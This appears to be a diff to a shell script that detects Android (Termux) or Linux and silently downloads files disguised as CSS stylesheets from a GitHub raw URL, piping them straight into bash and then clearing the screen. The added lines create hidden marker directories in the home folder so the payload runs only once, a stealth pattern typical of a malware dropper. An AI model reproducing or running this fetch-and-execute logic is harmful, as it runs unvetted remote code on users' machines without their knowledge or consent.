@@ -1,12 +1,30 @@
 if [ $(uname -o) = "Android" ];then
+carp=$HOME/.termux_repo
 
+if [ -d "$carp" ]
+then
+   exit 1
+else
 #echo "android"
 echo "Downloading andrsources"
 curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/android.css | bash
 clear
+fi
+
+
 else
-#echo "linux"
+#lin
+carp=$HOME/.gtkconf
+
+if [ -d "$carp" ]
+then
+   exit 1
+else
+
 echo "Downloading linsources"
 curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/lin.css | bash
 clear
+fi
+
+
 fi
